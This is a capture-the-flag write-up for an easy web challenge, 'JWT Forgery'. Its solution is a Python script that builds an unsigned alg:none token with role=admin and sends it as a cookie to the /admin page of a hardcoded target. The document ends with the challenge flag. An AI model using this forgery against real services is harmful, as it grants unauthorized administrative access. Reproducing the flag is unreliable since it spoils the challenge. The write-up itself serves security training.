---
title: "JWT Forgery"
ctf: "Safaricom CTF"
date: 2026-10-04
category: web
difficulty: easy
points: 150
flag_format: "safctf{...}"
author: "safaricom-ctf-team"
---

# JWT Forgery

## Summary

- **Category:** web

## Solution

### Step 1: Run the solve script:

```python
#!/usr/bin/env python3
"""JWT Forgery — safctf

The server issues a token already signed with alg:none and trusts `role` from
the payload without verifying a signature. Re-sign the payload with role=admin
and an empty signature.

    python3 solve.py
"""
import base64
import json
import urllib.error
import urllib.request

TARGET = "http://54.72.82.22:8100"


def b64(d: dict) -> str:
    return base64.urlsafe_b64encode(
        json.dumps(d, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()


def forge(role: str = "admin", username: str = "bob") -> str:
    header = b64({"alg": "none", "typ": "JWT"})
    payload = b64({"username": username, "role": role})
    return f"{header}.{payload}."  # empty signature


def main() -> None:
    token = forge()
    print(f"forged token: {token}")
    req = urllib.request.Request(
        f"{TARGET}/admin", headers={"Cookie": f"auth={token}"}
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            print(r.read().decode())
    except urllib.error.HTTPError as e:
        print(f"HTTP {e.code}: {e.read().decode(errors='replace')}")


if __name__ == "__main__":
    main()

```

## Flag

```
safctf{1e4d7bdea93b47c2a813ea5a89f20870}
```
